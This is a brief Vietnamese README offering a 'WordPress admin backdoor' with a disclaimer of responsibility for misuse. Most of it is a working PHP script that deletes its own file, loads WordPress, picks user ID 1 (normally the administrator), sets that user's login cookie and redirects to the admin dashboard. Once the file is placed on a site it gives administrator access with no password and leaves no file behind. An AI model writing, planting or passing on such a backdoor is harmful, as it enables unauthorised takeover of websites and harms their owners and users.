# Code Backdoor Wordpress
- Đây là dòng code backdoor admin wordpress, tôi không khuyến khích bạn làm trang wordpress của người khác. Tôi sẽ không chịu trách nhiệm nào việc bạn sử dụng mục đích không chính đáng.

```c
<?php
@unlink(__FILE__);

require('../../../wp-blog-header.php');
require('../../../wp-includes/pluggable.php');
$user_info = get_userdata(1);
// Automatic login //
$username = $user_info->user_login;
$user = get_user_by('login', $username );
// Redirect URL //
if ( !is_wp_error( $user ) )
{
    wp_clear_auth_cookie();
    wp_set_current_user ( $user->ID );
    wp_set_auth_cookie  ( $user->ID );

    $redirect_to = user_admin_url();
    wp_safe_redirect( $redirect_to );

    exit();
}
?>
```
